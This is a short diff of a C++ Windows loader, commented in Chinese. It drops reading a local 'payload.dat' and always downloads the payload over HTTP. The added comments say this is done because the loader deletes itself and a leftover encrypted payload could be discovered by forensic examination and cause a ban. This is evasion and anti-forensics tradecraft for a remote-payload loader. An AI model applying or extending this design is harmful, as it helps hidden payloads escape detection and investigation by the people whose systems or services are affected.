@@ -294,29 +294,10 @@ static bool TryDownloadUrl(const wchar_t* url, DWORD openType, std::vector<uint8
 }
 
 // ★ v3.129: 本地 payload.dat 优先 (开发迭代), HTTP 作为降级
+// ★ v3.296: 移除本地优先逻辑 — 强制 HTTP 下载, 避免本地 payload.dat 残留被封禁风险
+//   原因: payload.dat 虽加密, 但 loader.exe 自删后残留, 人工取证可发现
+//   修改: 始终从 HTTP 下载, 本地有 payload.dat 也忽略
 static std::vector<uint8_t> DownloadPayload() {
-    // BUILD 466: 本地文件优先 — 不受 GitHub CDN 缓存影响
-    wchar_t localPath[MAX_PATH];
-    GetModuleFileNameW(nullptr, localPath, MAX_PATH);
-    wchar_t* lastSlash = wcsrchr(localPath, L'\\');
-    if (lastSlash) *(lastSlash + 1) = 0;
-    wcscat_s(localPath, L"payload.dat");
-    LoaderDiag("  DL: trying local %ls\n", localPath);
-    HANDLE hFile = CreateFileW(localPath, GENERIC_READ, FILE_SHARE_READ,
-        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
-    if (hFile != INVALID_HANDLE_VALUE) {
-        DWORD sz = GetFileSize(hFile, nullptr);
-        std::vector<uint8_t> buf(sz);
-        DWORD rd = 0;
-        if (ReadFile(hFile, buf.data(), sz, &rd, nullptr) && rd == sz) {
-            CloseHandle(hFile);
-            LoaderDiag("  DL: LOCAL FILE SUCCESS (%u bytes)\n", sz);
-            return buf;
-        }
-        CloseHandle(hFile);
-    }
-    LoaderDiag("  DL: local file not found, trying HTTP...\n");
-
     // ★ v3.111: 多 URL + 多连接类型轮询下载
     static const DWORD openTypes[] = {
         INTERNET_OPEN_TYPE_DIRECT,
